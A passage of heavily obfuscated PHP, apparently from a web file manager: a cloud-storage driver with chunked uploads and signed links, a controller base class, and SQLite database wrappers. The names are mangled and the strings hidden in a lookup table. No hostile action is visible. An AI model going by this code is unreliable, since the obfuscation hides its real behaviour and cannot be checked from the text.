ş¿¦[8]; while (!0) { check_abort(); $µ™ƒ×ù³ = $this->listObjs($Ù‡Ç—Ùù, $Ó³’·û„, $è§Ïœù); if (!$µ™ƒ×ù³) { return !1; } $Ó³’·û„ = isset($µ™ƒ×ù³[$üÄ ş¿¦[1451]]) ? $µ™ƒ×ù³[$üÄ ş¿¦[1451]] : $üÄ ş¿¦[12]; $ïŠ¤Î´ö = isset($µ™ƒ×ù³[$üÄ ş¿¦[1452]]) ? $µ™ƒ×ù³[$üÄ ş¿¦[1452]] : array(); if (empty($ïŠ¤Î´ö)) { break; } $‡ı‘ì”Í = array_filter($ïŠ¤Î´ö, function ($Ë“ş‘“) { $ºì™äÚ =& $_SERVER[® ¨Ä®ñ]; return $Ë“ş‘“[$ºì™äÚ[33]] == $ºì™äÚ[79]; }); $Ê¾£Šç° = count($ïŠ¤Î´ö); $‡ı‘ì”Í = count($‡ı‘ì”Í); $Ê’Ø¡ï¾ = $Ê¾£Šç° - $‡ı‘ì”Í; if ($ÆÛˆ‹ö¤) { $˜áÒäõØ += $‡ı‘ì”Í; $İ§ŒöéÒ += $Ê’Ø¡ï¾; if ($Ê¾£Šç° < $è§Ïœù) { break; } continue; } if ($¨İ¢…µ¨) { if ($Ê’Ø¡ï¾) { return !0; } } else { if ($‡ı‘ì”Í) { return !0; } } if ($Ê¾£Šç° < $è§Ïœù) { break; } } if ($ÆÛˆ‹ö¤) { return array($üÄ ş¿¦[202] => $İ§ŒöéÒ, $üÄ ş¿¦[203] => $˜áÒäõØ); } return !1; } public function listAll($ÙÀô„”Ú) { $–»Ì¶¾ñ =& $_SERVER[® ¨Ä®ñ]; $›Æ„›óâ = $ƒĞ¡´”à = array(); $this->fileList($ÙÀô„”Ú, $›Æ„›óâ, $ƒĞ¡´”à, !0); $¡àµØ¶× = array(); foreach ($ƒĞ¡´”à as $ÓØ¼¹ÀŸ) { $¡àµØ¶×[$ÓØ¼¹ÀŸ[$–»Ì¶¾ñ[32]]] = $ÓØ¼¹ÀŸ[$–»Ì¶¾ñ[80]]; } foreach ($›Æ„›óâ as $ÓØ¼¹ÀŸ) { if (is_string($ÓØ¼¹ÀŸ)) { $¡àµØ¶×[$ÓØ¼¹ÀŸ] = 0; } } return $this->listAllFiles($ÙÀô„”Ú, array_keys($¡àµØ¶×), $¡àµØ¶×); } public function canRead($œ•ã¿•†) { return $this->exist($œ•ã¿•†) ? !0 : !1; } public function canWrite($­Ö”Î†ã) { return $this->exist($­Ö”Î†ã) ? !0 : !1; } public function getContent($Ş÷‘‹Œ) { return $this->fileSubstr($Ş÷‘‹Œ, 0, -1); } public function setContent($Ø¯ô—²‡, $³şä‘¥ = '') { $ç±’ÆÊ =& $_SERVER[® ¨Ä®ñ]; if (!$³şä‘¥) { $­ÌŠ‹„¤ = $this->ussRequest($Ø¯ô—²‡, $ç±’ÆÊ[221]); return $­ÌŠ‹„¤[$ç±’ÆÊ[1173]]; } $¯ƒ—×¦ = $this->tempFile($this->pathThis($Ø¯ô—²‡)); file_put_contents($¯ƒ—×¦, $³şä‘¥); if ($this->upload($Ø¯ô—²‡, $¯ƒ—×¦)) { $this->tempFileRemve($¯ƒ—×¦); return !0; } return !1; } public function fileSubstr($º›ıÈ, $ÌŸ¡Ò, $Ñ‚ª²„) { $†ÒíÅ¥Å =& $_SERVER[® ¨Ä®ñ]; if (!($È¥ÎÎÁ£ = $this->link($º›ıÈ))) { return !1; } $Ô—œàÓ¯ = !1; if ($Ñ‚ª²„ > 0) { $Ğ”Ş®¯á = $ÌŸ¡Ò + $Ñ‚ª²„ - 1; $Ô—œàÓ¯ = array($†ÒíÅ¥Å[1414] . $ÌŸ¡Ò . $†ÒíÅ¥Å[451] . $Ğ”Ş®¯á); } $Ê‚…¿Ä = url_request($È¥ÎÎÁ£, $†ÒíÅ¥Å[225], !1, $Ô—œàÓ¯); return $Ê‚…¿Ä[$†ÒíÅ¥Å[732]] ? $Ê‚…¿Ä[$†ÒíÅ¥Å[1175]] : !1; } public function upload($ğ‹÷Š, $­Êæğ¬î, $Ë…•Ï° = false, $‚—ê·© = REPEAT_REPLACE) { $†òÄ¥Ÿ˜ =& $_SERVER[® ¨Ä®ñ]; $½¢Ã«¤š = IO::size($­Êæğ¬î); if ($½¢Ã«¤š <= 1024 * 1024 * 200) { $–‹¯ãŸÔ = array($†òÄ¥Ÿ˜[1454] . $­Êæğ¬î); $İÙàÄ÷Í = $this->ussRequest($ğ‹÷Š, $†òÄ¥Ÿ˜[223], $–‹¯ãŸÔ); return $İÙàÄ÷Í[$†òÄ¥Ÿ˜[1173]] ? $this->getPathOuter($ğ‹÷Š) : !1; } $Ğ©Ğìµù = 1024 * 1024 * 10; $„Ä†ö¡‡ = array($†òÄ¥Ÿ˜[1455], $†òÄ¥Ÿ˜[1456] . $½¢Ã«¤š, $†òÄ¥Ÿ˜[1457], $†òÄ¥Ÿ˜[1458] . $Ğ©Ğìµù); $İÙàÄ÷Í = $this->ussRequest($ğ‹÷Š, $†òÄ¥Ÿ˜[223], !1, $„Ä†ö¡‡); if (!$İÙàÄ÷Í[$†òÄ¥Ÿ˜[1173]]) { return !1; } $µ‹š²œ¹ = $İÙàÄ÷Í[$†òÄ¥Ÿ˜[1175]]; $¬¬çÅ© = 0; $Á¾¢Ëù = $µ‹š²œ¹[$†òÄ¥Ÿ˜[1459]]; $òÁóøó¦ = fopen($­Êæğ¬î, $†òÄ¥Ÿ˜[1363]); if (!$òÁóøó¦) { return !1; } do { $ˆ†¼ªŸŒ = $µ‹š²œ¹[$†òÄ¥Ÿ˜[1460]]; fseek_64($òÁóøó¦, $¬¬çÅ©); $Şˆù¶ßø = fread($òÁóøó¦, $ˆ†¼ªŸŒ); $ŒùÜÍ×è = 0; do { $ŒùÜÍ×è++; $µ‹š²œ¹ = $this->uploadPart($ğ‹÷Š, $µ‹š²œ¹, $Şˆù¶ßø); } while (!$µ‹š²œ¹ && $ŒùÜÍ×è < 3); if (!$µ‹š²œ¹) { return !1; } $Á¾¢Ëù = $µ‹š²œ¹[$†òÄ¥Ÿ˜[1459]]; $¬¬çÅ© += $ˆ†¼ªŸŒ; } while ($Á¾¢Ëù != -1); fclose($òÁóøó¦); $„Ä†ö¡‡ = array($†òÄ¥Ÿ˜[1461], $†òÄ¥Ÿ˜[1462] . $µ‹š²œ¹[$†òÄ¥Ÿ˜[1463]], $†òÄ¥Ÿ˜[1457]); $İÙàÄ÷Í = $this->ussRequest($ğ‹÷Š, $†òÄ¥Ÿ˜[223], !1, $„Ä†ö¡‡); return $İÙàÄ÷Í[$†òÄ¥Ÿ˜[1173]] ? $this->getPathOuter($œáºœò’) : !1; } private function uploadPart($¦òø†İ, $Ÿê‚ ‹±, &$ˆ÷Ê†Û) { $ì­ü”³Î =& $_SERVER[® ¨Ä®ñ]; $³±¿ƒşì = array($ì­ü”³Î[1464], $ì­ü”³Î[1462] . $Ÿê‚ ‹±[$ì­ü”³Î[1463]], $ì­ü”³Î[1465] . $Ÿê‚ ‹±[$ì­ü”³Î[1459]], $ì­ü”³Î[139] . $Ÿê‚ ‹±[$ì­ü”³Î[1460]]); $¸çşùÅ­ = $this->ussRequest($¦òø†İ, $ì­ü”³Î[223], $ˆ÷Ê†Û, $³±¿ƒşì); return !$¸çşùÅ­[$ì­ü”³Î[1173]] ? $¸çşùÅ­[$ì­ü”³Î[1173]] : $¸çşùÅ­[$ì­ü”³Î[1175]]; } public function uploadFormData($æÜƒ–ªÖ, $õøÒéÙ = 3600) { return $this->uploadPolicy($æÜƒ–ªÖ, $õøÒéÙ); } public function multiUploadFormData($Õ™ğ«˜È, $Æ˜ë´ò = 3600) { $êª°—¹× =& $_SERVER[® ¨Ä®ñ]; $ÄÕï‘´Õ = (int) $GLOBALS[$êª°—¹×[7]][$êª°—¹×[80]]; return $this->uploadPolicy($Õ™ğ«˜È, $Æ˜ë´ò, $ÄÕï‘´Õ); } private function uploadPolicy($§–È²…õ, $çõÉÚĞ = 3600, $ù¶«Ïâ¤ = 0) { $ğÑøó÷ =& $_SERVER[® ¨Ä®ñ]; $ÚŠÊ°˜š = $ğÑøó÷[8] . $this->bucket; $€‰ Ê†œ = gmdate($ğÑøó÷[1399]); $½ ÈœÜ¬ = array($ğÑøó÷[1466] => $this->bucket, $ğÑøó÷[1467] => $§–È²…õ, $ğÑøó÷[1468] => time() + $çõÉÚĞ, $ğÑøó÷[1469] => $€‰ Ê†œ); if ($ù¶«Ïâ¤) { $½ ÈœÜ¬[$ğÑøó÷[1379]] = $ù¶«Ïâ¤; } $ ¤„Ôïã = base64_encode(json_encode($½ ÈœÜ¬)); $ÖêóäÌ = base64_encode(hash_hmac($ğÑøó÷[1436], "\x50\117\x53\124\x26{$ÚŠÊ°˜š}\46{$€‰ Ê†œ}\46{$ ¤„Ôïã}", md5("{$this->userpass}"), !0)); $´ƒÀ§‚¶ = array($ğÑøó÷[1304] => $ ¤„Ôïã, $ğÑøó÷[1470] => "\125\x50\131\x55\x4e\40{$this->username}\72{$ÖêóäÌ}", $ğÑøó÷[174] => $this->endpoint . $ÚŠÊ°˜š); return $´ƒÀ§‚¶; } public function download($¯äàûŞ, $«µ»»ßğ) { $©æßƒÛÖ = IO::getPathInner(IO::mkfile($«µ»»ßğ)); if (!($©Ç†œ×© = $this->link($¯äàûŞ))) { return !1; } $á©÷ºÍï = 0; $£È»ÍØÊ = 1024 * 200; $÷şÉØœ§ = fopen($©æßƒÛÖ, $_SERVER[® ¨Ä®ñ][1420]); while (!0) { $Š×İƒä = $this->fileSubstr($¯äàûŞ, $á©÷ºÍï, $£È»ÍØÊ); if ($Š×İƒä === !1) { return !1; } fwrite($÷şÉØœ§, $Š×İƒä); $á©÷ºÍï += $£È»ÍØÊ; if (strlen($Š×İƒä) < $£È»ÍØÊ) { break; } } fclose($÷şÉØœ§); return $«µ»»ßğ; } public function link($„ÜÜ©­é, $à³İÌşè = array()) { $ƒ·¯ÍÃ =& $_SERVER[® ¨Ä®ñ]; $„ÜÜ©­é = trim($„ÜÜ©­é, $ƒ·¯ÍÃ[8]); if (!empty($this->token)) { $®õó—Ò“ = strtotime(date($ƒ·¯ÍÃ[1471])); $æøÚª™Ÿ = substr(md5($this->token . $ƒ·¯ÍÃ[279] . $®õó—Ò“ . $ƒ·¯ÍÃ[1472] . $„ÜÜ©­é), 12, 8) . $®õó—Ò“; $à³İÌşè[] = $ƒ·¯ÍÃ[1473] . $æøÚª™Ÿ; } $çõâ×Åƒ = !empty($à³İÌşè) ? $ƒ·¯ÍÃ[73] . implode($ƒ·¯ÍÃ[279], $à³İÌşè) : $ƒ·¯ÍÃ[12]; return $this->getHost() . $ƒ·¯ÍÃ[8] . $„ÜÜ©­é . $çõâ×Åƒ; } public function fileOut($Ó¶¬‚ÖŸ, $Ş±ğÏ§Ò = false, $ïËÆ„‹Ø = false, $óıÁ¾Äà = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Ó¶¬‚ÖŸ, $Ş±ğÏ§Ò, $ïËÆ„‹Ø, $óıÁ¾Äà); } if (!$ïËÆ„‹Ø) { $ïËÆ„‹Ø = $this->pathThis($Ó¶¬‚ÖŸ); } $îÈÖäƒ = $Ş±ğÏ§Ò ? array($_SERVER[® ¨Ä®ñ][1474] . rawurlencode($ïËÆ„‹Ø)) : array(); $ƒ¾‹×ğ = $this->link($Ó¶¬‚ÖŸ, $îÈÖäƒ); $this->fileOutLink($ƒ¾‹×ğ); } public function fileOutServer($İßâßÆ, $Ş€çÜıª = false, $×ÎŒíØæ = false, $è±½Ô«¢ = '') { parent::fileOut($İßâßÆ, $Ş€çÜıª, $×ÎŒíØæ, $è±½Ô«¢); } public function fileOutImage($„É•şŸ¸, $€Ã­­Û¸ = 250) { $ùàíÉâ = $this->link($„É•şŸ¸ . $_SERVER[® ¨Ä®ñ][1475] . $€Ã­­Û¸); $this->fileOutLink($ùàíÉâ); } public function fileOutImageServer($ŠÅíıÁ, $ÙÜèÑ§ø = 250) { parent::fileOutImage($ŠÅíıÁ, $ÙÜèÑ§ø); } public function hashMd5($—ÆÙè½‘) { $úõ¥á¯ù =& $_SERVER[® ¨Ä®ñ]; $¶•®Œ‹É = $this->_objectMeta($—ÆÙè½‘); return isset($¶•®Œ‹É[$úõ¥á¯ù[207]]) ? $¶•®Œ‹É[$úõ¥á¯ù[207]] : !1; } public function size($³¹ê†‹š) { $¥ÍËğ¸ = $this->objectMeta($³¹ê†‹š); return $¥ÍËğ¸ ? $¥ÍËğ¸[$_SERVER[® ¨Ä®ñ][80]] : 0; } public function info($Ùƒ´ıŸî) { if ($this->isFolder($Ùƒ´ıŸî)) { return $this->folderInfo($Ùƒ´ıŸî); } else { if ($this->isFile($Ùƒ´ıŸî)) { return $this->fileInfo($Ùƒ´ıŸî); } } return !1; } public function exist($¢İİ™îµ) { return $this->isFile($¢İİ™îµ) || $this->isFolder($¢İİ™îµ); } public function isFile($’çİ’£Ö) { return !$this->isFolder($’çİ’£Ö) && $this->objectMeta($’çİ’£Ö); } public function isFolder($”é€Ğ†Ë) { return $this->cacheMethod($_SERVER[® ¨Ä®ñ][198], $”é€Ğ†Ë); } protected function objectMeta($­‰ÛÅı) { return $this->cacheMethod($_SERVER[® ¨Ä®ñ][199], $­‰ÛÅı); } protected function _objectMeta($Ş³Øæ) { $ÈßÄ—¨É =& $_SERVER[® ¨Ä®ñ]; if ($Ş³Øæ == $ÈßÄ—¨É[12] || $Ş³Øæ == $ÈßÄ—¨É[8]) { return array(); } $Ì‡‹åÙŠ = $this->ussRequest($Ş³Øæ, $ÈßÄ—¨É[1476]); if (!$Ì‡‹åÙŠ[$ÈßÄ—¨É[1173]]) { return null; } $œ³ÕÂµ = isset($Ì‡‹åÙŠ[$ÈßÄ—¨É[1175]]) ? $Ì‡‹åÙŠ[$ÈßÄ—¨É[1175]] : array(); if (!isset($œ³ÕÂµ[$ÈßÄ—¨É[1477]])) { return null; } $õ¬ÂÈ = array($ÈßÄ—¨É[33] => isset($œ³ÕÂµ[$ÈßÄ—¨É[1477]]) ? $œ³ÕÂµ[$ÈßÄ—¨É[1477]] : null, $ÈßÄ—¨É[80] => isset($œ³ÕÂµ[$ÈßÄ—¨É[1478]]) ? $œ³ÕÂµ[$ÈßÄ—¨É[1478]] : null, $ÈßÄ—¨É[207] => isset($œ³ÕÂµ[$ÈßÄ—¨É[1479]]) ? $œ³ÕÂµ[$ÈßÄ—¨É[1479]] : null, $ÈßÄ—¨É[1446] => isset($œ³ÕÂµ[$ÈßÄ—¨É[1480]]) ? $œ³ÕÂµ[$ÈßÄ—¨É[1480]] : null); $õ¬ÂÈ[$ÈßÄ—¨É[1447]] = isset($œ³ÕÂµ[$ÈßÄ—¨É[1481]]) ? strtotime($œ³ÕÂµ[$ÈßÄ—¨É[1481]]) : $õ¬ÂÈ[$ÈßÄ—¨É[1446]]; return $õ¬ÂÈ; } protected function _isFolder($é‹½Ğú¸) { $—ŒİÃ¾İ =& $_SERVER[® ¨Ä®ñ]; if ($é‹½Ğú¸ == $—ŒİÃ¾İ[12] || $é‹½Ğú¸ == $—ŒİÃ¾İ[8]) { return !0; } $û¤¼ñ™‘ = $this->_objectMeta($é‹½Ğú¸); return isset($û¤¼ñ™‘[$—ŒİÃ¾İ[33]]) && $û¤¼ñ™‘[$—ŒİÃ¾İ[33]] == $—ŒİÃ¾İ[79] ? !0 : !1; } } goto d²»ÆÅæÈë; f˜î³âó¬İ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ˆ¤ÔñŒ¬ =& $_SERVER[® ¨Ä®ñ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ˆ¤ÔñŒ¬[6]] =& $config; $this->values[$ˆ¤ÔñŒ¬[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ˆ¤ÔñŒ¬[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($·’Ô’) { if (1 === func_num_args()) { $this->{$·’Ô’} = new $·’Ô’(); } else { $²šÖÄŠÔ = new ReflectionClass($·’Ô’); $ê›ƒì™Á = func_get_args(); array_shift($ê›ƒì™Á); $this->{$·’Ô’} = $²šÖÄŠÔ->newInstanceArgs($ê›ƒì™Á); } return $this->{$·’Ô’}; } public function routeBind($°şÆ®†ı, $ïÅàÖÎ©, $½ëÔ¥×Ô = 3) { $šĞ…ÇÙ =& $_SERVER[® ¨Ä®ñ]; $ûî÷‡Åò = $this->in[$šĞ…ÇÙ[9]]; $°şÆ®†ı = str_replace($šĞ…ÇÙ[10], $šĞ…ÇÙ[11], trim(trim($°şÆ®†ı, $šĞ…ÇÙ[8]), $šĞ…ÇÙ[12])); if (!$°şÆ®†ı || count($ûî÷‡Åò) <= $½ëÔ¥×Ô) { return !1; } $º¶âºŞå = !0; $°£â¿Ó… = explode($šĞ…ÇÙ[8], $°şÆ®†ı); for ($ĞàÁ«ùÊ = 0; $ĞàÁ«ùÊ < count($°£â¿Ó…); $ĞàÁ«ùÊ++) { if ($°£â¿Ó…[$ĞàÁ«ùÊ] != $ûî÷‡Åò[$½ëÔ¥×Ô + $ĞàÁ«ùÊ]) { $º¶âºŞå = !1; break; } } if (!$º¶âºŞå) { return; } call_user_func_array(array($this, $ïÅàÖÎ©), array()); } public function routeArgs($îÙÕ™Íº = 3) { $®Ïİãé“ = $this->in[$_SERVER[® ¨Ä®ñ][9]]; if (count($®Ïİãé“) <= $îÙÕ™Íº) { return array(); } $·÷„İÙ§ = array(); for ($‹¢éĞ³” = $îÙÕ™Íº; $‹¢éĞ³” < count($®Ïİãé“); $‹¢éĞ³” += 2) { $·÷„İÙ§[$®Ïİãé“[$‹¢éĞ³”]] = $®Ïİãé“[$‹¢éĞ³” + 1]; $this->in[$®Ïİãé“[$‹¢éĞ³”]] = $®Ïİãé“[$‹¢éĞ³” + 1]; } return $·÷„İÙ§; } protected function assign($¸è©Æ¤’, $´…•öúå) { $this->values[$¸è©Æ¤’] = $´…•öúå; } protected function display($¨ô°É¢ö) { ob_end_clean(); extract($this->values); require $this->tpl . $¨ô°É¢ö; } } class DbSqliteBase extends Db { public function __construct($‰é›÷Ú÷ = '') { $É±º¥Å =& $_SERVER[® ¨Ä®ñ]; if (!extension_loaded($É±º¥Å[13])) { think_exception(think_lang($É±º¥Å[14]) . $É±º¥Å[15]); } if (!empty($‰é›÷Ú÷)) { if (!isset($‰é›÷Ú÷[$É±º¥Å[16]])) { $‰é›÷Ú÷[$É±º¥Å[16]] = 438; } $this->config = $‰é›÷Ú÷; if (empty($this->config[$É±º¥Å[17]])) { $this->config[$É±º¥Å[17]] = array(); } } } public function connect($ò¡¿ûñ‹ = '', $ğ€¸úãš = 0) { $Ê´İŠÄÚ =& $_SERVER[® ¨Ä®ñ]; if (!isset($this->linkID[$ğ€¸úãš])) { if (empty($ò¡¿ûñ‹)) { $ò¡¿ûñ‹ = $this->config; } $úæ¾‡“ = !empty($ò¡¿ûñ‹[$Ê´İŠÄÚ[17]][$Ê´İŠÄÚ[18]]) ? $ò¡¿ûñ‹[$Ê´İŠÄÚ[17]][$Ê´İŠÄÚ[18]] : $this->pconnect; $¡ó›·†† = $úæ¾‡“ ? $Ê´İŠÄÚ[19] : $Ê´İŠÄÚ[20]; $this->linkID[$ğ€¸úãš] = $¡ó›·††($ò¡¿ûñ‹[$Ê´İŠÄÚ[21]], $ò¡¿ûñ‹[$Ê´İŠÄÚ[16]]); if (!$this->linkID[$ğ€¸úãš]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ğ€¸úãš], 30000); if (1 != think_config($Ê´İŠÄÚ[22])) { unset($this->config); } } return $this->linkID[$ğ€¸úãš]; } public function free() { $this->queryID = null; } public function query($¦ß˜¨ØÏ) { $ªàÔ¿ë¥ =& $_SERVER[® ¨Ä®ñ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¦ß˜¨ØÏ; if ($this->queryID) { $this->free(); } think_action_status($ªàÔ¿ë¥[23], 1); think_status($ªàÔ¿ë¥[24]); $this->queryID = sqlite_query($this->_linkID, $¦ß˜¨ØÏ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $€ßĞÍÓ = $this->getAll(); return $€ßĞÍÓ; } } public function execute($ç·´¦Õ) { $ë‡öÀš† =& $_SERVER[® ¨Ä®ñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ç·´¦Õ; if ($this->queryID) { $this->free(); } think_action_status($ë‡öÀš†[25], 1); think_status($ë‡öÀš†[24]); $ı¢ÔœŒ  = sqlite_exec($this->_linkID, $ç·´¦Õ); $this->debug(); if (!1 === $ı¢ÔœŒ ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[® ¨Ä®ñ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $±Ğë‡ = sqlite_query($this->_linkID, $_SERVER[® ¨Ä®ñ][27]); if (!$±Ğë‡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $é…˜ôÏú = sqlite_query($this->_linkID, $_SERVER[® ¨Ä®ñ][28]); if (!$é…˜ôÏú) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¸µâ‘û = array(); if ($this->numRows > 0) { for ($äôßİ˜ = 0; $äôßİ˜ < $this->numRows; $äôßİ˜++) { $¸µâ‘û[$äôßİ˜] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¸µâ‘û; } public function getFields($»éüÛ‹Ï) { $Åì’¢û– =& $_SERVER[® ¨Ä®ñ]; $ı°ø¶¶¤ = $this->query($Åì’¢û–[29] . $»éüÛ‹Ï . $Åì’¢û–[30]); $¤ĞÜÇ¤ = array(); if ($ı°ø¶¶¤) { foreach ($ı°ø¶¶¤ as $§Ë¿¬Ú => $¿ã¿êú) { $¤ĞÜÇ¤[$¿ã¿êú[$Åì’¢û–[31]]] = array($Åì’¢û–[32] => $¿ã¿êú[$Åì’¢û–[31]], $Åì’¢û–[33] => $¿ã¿êú[$Åì’¢û–[34]], $Åì’¢û–[35] => (bool) ($¿ã¿êú[$Åì’¢û–[36]] === $Åì’¢û–[12]), $Åì’¢û–[37] => $¿ã¿êú[$Åì’¢û–[38]], $Åì’¢û–[39] => strtolower($¿ã¿êú[$Åì’¢û–[40]]) == $Åì’¢û–[41], $Åì’¢û–[42] => strtolower($¿ã¿êú[$Åì’¢û–[43]]) == $Åì’¢û–[44]); } } return $¤ĞÜÇ¤; } public function getTables($ß­ñÂÛ» = '') { $ñóˆª… =& $_SERVER[® ¨Ä®ñ]; $¤‡ÓÔ… = $this->query($ñóˆª…[45] . $ñóˆª…[46] . $ñóˆª…[47]); $Ï‘ïÌÕç = array(); foreach ($¤‡ÓÔ… as $ÇÅ¼°ô => $©ãè¿ç) { $Ï‘ïÌÕç[$ÇÅ¼°ô] = current($©ãè¿ç); } return $Ï‘ïÌÕç; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $«øğñÖ =& $_SERVER[® ¨Ä®ñ]; $×÷É‚Œó = sqlite_last_error($this->_linkID); $this->error = $×÷É‚Œó . $«øğñÖ[4] . sqlite_error_string($×÷É‚Œó); if ($«øğñÖ[12] != $this->queryStr) { $this->error .= LNG($«øğñÖ[48]) . $this->queryStr; } think_trace($this->error, $«øğñÖ[12], $«øğñÖ[49]); return $this->error; } public function escapeString($Úü³œ“) { return sqlite_escape_string($Úü³œ“); } public function parseLimit($Ø‰ƒ„éœ) { $áƒÑûã£ =& $_SERVER[® ¨Ä®ñ]; $‰æá±Ñ™ = $áƒÑûã£[12]; if (!empty($Ø‰ƒ„éœ)) { $Ø‰ƒ„éœ = explode($áƒÑûã£[50], $Ø‰ƒ„éœ); if (count($Ø‰ƒ„éœ) > 1) { $‰æá±Ñ™ .= $áƒÑûã£[51] . $Ø‰ƒ„éœ[1] . $áƒÑûã£[52] . $Ø‰ƒ„éœ[0] . $áƒÑûã£[53]; } else { $‰æá±Ñ™ .= $áƒÑûã£[51] . $Ø‰ƒ„éœ[0] . $áƒÑûã£[53]; } } return $‰æá±Ñ™; } } class DbSqlite3Base extends Db { public function __construct($õ§Ïü°· = '') { $œíŞ†ËŠ =& $_SERVER[® ¨Ä®ñ]; if (!class_exists($œíŞ†ËŠ[54])) { think_exception(think_lang($œíŞ†ËŠ[14]) . $œíŞ†ËŠ[55]); } if (!empty($õ§Ïü°·)) { if (!isset($õ§Ïü°·[$œíŞ†ËŠ[16]])) { $õ§Ïü°·[$œíŞ†ËŠ[16]] = 438; } $this->config = $õ§Ïü°·; if (empty($this->config[$œíŞ†ËŠ[17]])) { $this->config[$œíŞ†ËŠ[17]] = array(); } } } public function connect($µãÌìÂÉ = '', $êê½ˆş› = 0) { $ôçÏ½‘½ =& $_SERVER[® ¨Ä®ñ]; if (!isset($this->linkID[$êê½ˆş›])) { if (empty($µãÌìÂÉ)) { $µãÌìÂÉ = $this->config; } $this->linkID[$êê½ˆş›] = new SQLite3($µãÌìÂÉ[$ôçÏ½‘½[21]]); if (!$this->linkID[$êê½ˆş›]) { think_exception($this->linkID[$êê½ˆş›]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$êê½ˆş›]->busyTimeout(30000); if (1 != think_config($ôçÏ½‘½[22])) { unset($this->config); } } return $this->linkID[$êê½ˆş›]; } public function free() { $this->queryID = null; } public function query($ı‰Í‹ó) { $‚€Èö§Ì =& $_SERVER[® ¨Ä®ñ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ı‰Í‹ó; if ($this->queryID) { $this->free(); } think_action_status($‚€Èö§Ì[23], 1); think_status($‚€Èö§Ì[24]); $this->queryID = $this->_linkID->query($ı‰Í‹ó); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $³œèÅÅû = $this->getAll(); $this->numRows = count($³œèÅÅû); return $³œèÅÅû; } } public function execute($İ¡àìä) { $º¯Æ®ÏŒ =& $_SERVER[® ¨Ä®ñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $İ¡àìä; if ($this->queryID) { $this->free(); } think_action_status($º¯Æ®ÏŒ[25], 1); think_status($º¯Æ®ÏŒ[24]); $èèìä² = $this->_linkID->exec($İ¡àìä); $this->debug(); if (!1 === $èèìä²) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[® ¨Ä®ñ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $éÏ³…† = $this->_linkID->query($_SERVER[® ¨Ä®ñ][27]); if (!$éÏ³…†) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $·¶¢éÌË = $this->_linkID->query($_SERVER[® ¨Ä®ñ][28]); if (!$·¶¢éÌË) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ã¬ê£ÌÃ = array(); while ($¡ü¯›ş = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Ã¬ê£ÌÃ[] = $¡ü¯›ş; } $this->queryID->reset(); return $Ã¬ê£ÌÃ; } public function getFields($×ø«î‡º) { $¯¢ôö§Ö =& $_SERVER[® ¨Ä®ñ]; $¸Š–ççŒ = $this->query($¯¢ôö§Ö[29] . $×ø«î‡º . $¯¢ôö§Ö[30]); $‚¤ŞÃ­ = array(); if ($¸Š–ççŒ) { foreach ($¸Š–ççŒ as $ª‹äàçü => $¤Ô’ä‹•) { $‚¤ŞÃ­[$¤Ô’ä‹•[$¯¢ôö§Ö[32]]] = array($¯¢ôö§Ö[32] => $¤Ô’ä‹•[$¯¢ôö§Ö[32]], $¯¢ôö§Ö[33] => $¤Ô’ä‹•[$¯¢ôö§Ö[33]], $¯¢ôö§Ö[35] => (bool) ($¤Ô’ä‹•[$¯¢ôö§Ö[35]] === $¯¢ôö§Ö[12]), $¯¢ôö§Ö[37] => $¤Ô’ä‹•[$¯¢ôö§Ö[56]], $¯¢ôö§Ö[39] => (bool) $¤Ô’ä‹•[$¯¢ôö§Ö[57]], $¯¢ôö§Ö[42] => (bool) $¤Ô’ä‹•[$¯¢ôö§Ö[57]]); } } return $‚¤ŞÃ­; } public function getTables($ƒÊ÷şÛ‰ = '') { $ı–ëÕİæ =& $_SERVER[® ¨Ä®ñ]; $Èüìù½÷ = $this->query($ı–ëÕİæ[45] . $ı–ëÕİæ[46] . $ı–ëÕİæ[47]); $©İ©î³­ = array(); foreach ($Èüìù½÷ as $ßÀıÖĞ => $¤ì¸°¼â) { $©İ©î³­[$ßÀıÖĞ] = current($¤ì¸°¼â); } return $©İ©î³­; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $è…üƒ =& $_SERVER[® ¨Ä®ñ]; $this->error = $this->_linkID->lastErrorMsg(); if ($è…üƒ[12] != $this->queryStr) { $this->error .= LNG($è…üƒ[48]) . $this->queryStr; } think_trace($this->error, $è…üƒ[12], $è…üƒ[49]); return $this->error; } public function escapeString($¤Á¿ê´) { $şşš©¬Ö =& $_SERVER[® ¨Ä®ñ]; if ($this->_linkID) { return $this->_linkID->escapeString($¤Á¿ê´); } return 